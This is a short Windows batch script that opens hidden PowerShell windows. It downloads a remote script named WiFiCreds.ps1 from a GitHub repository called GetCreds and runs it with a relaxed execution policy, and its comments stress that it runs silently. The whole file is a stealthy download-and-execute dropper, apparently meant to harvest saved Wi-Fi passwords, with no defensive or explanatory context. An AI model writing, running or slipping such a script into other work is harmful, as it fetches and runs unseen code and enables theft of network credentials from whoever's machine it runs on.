::Runs Silently
@echo off
::Downloads PS Script Silently
powershell -WindowStyle hidden -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Zmk55/GetCreds/main/WiFiCreds.ps1 -Outfil .\WifiCreds.ps1"
::Executes PS Script Silently
powershell -WindowStyle hidden -executionpolicy remotesigned -File .\WifiCreds.ps1
